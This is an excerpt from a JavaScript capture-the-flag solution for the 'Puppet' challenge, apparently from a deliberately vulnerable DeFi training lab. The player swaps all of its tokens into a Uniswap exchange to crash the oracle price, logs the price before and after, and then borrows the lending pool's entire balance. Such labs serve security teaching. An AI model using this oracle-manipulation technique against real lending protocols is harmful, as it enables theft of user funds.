...
describe('[Challenge] Puppet', function () {
    ...
    it('Execution', async function () {
        ...
        async function log(msg, amount = POOL_INITIAL_TOKEN_BALANCE) {
            const exchangeTokens = BigInt(await token.balanceOf(uniswapExchange.address));
            const exchangeEth = BigInt(await ethers.provider.getBalance(uniswapExchange.address))

            console.log(msg, {
                price: calculateTokenToEthInputPrice(
                    amount,
                    exchangeTokens,
                    exchangeEth
                ) / 10n ** 18n,
        ...
        await log('Price before attack');
        await token.connect(player).approve(uniswapExchange.address, PLAYER_INITIAL_TOKEN_BALANCE);
        await uniswapExchange.connect(player).tokenToEthSwapInput(PLAYER_INITIAL_TOKEN_BALANCE, 1, deadline);

        await log('Price after attack');
        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE, player.address, { value: 25n * 10n ** 18n })
    });
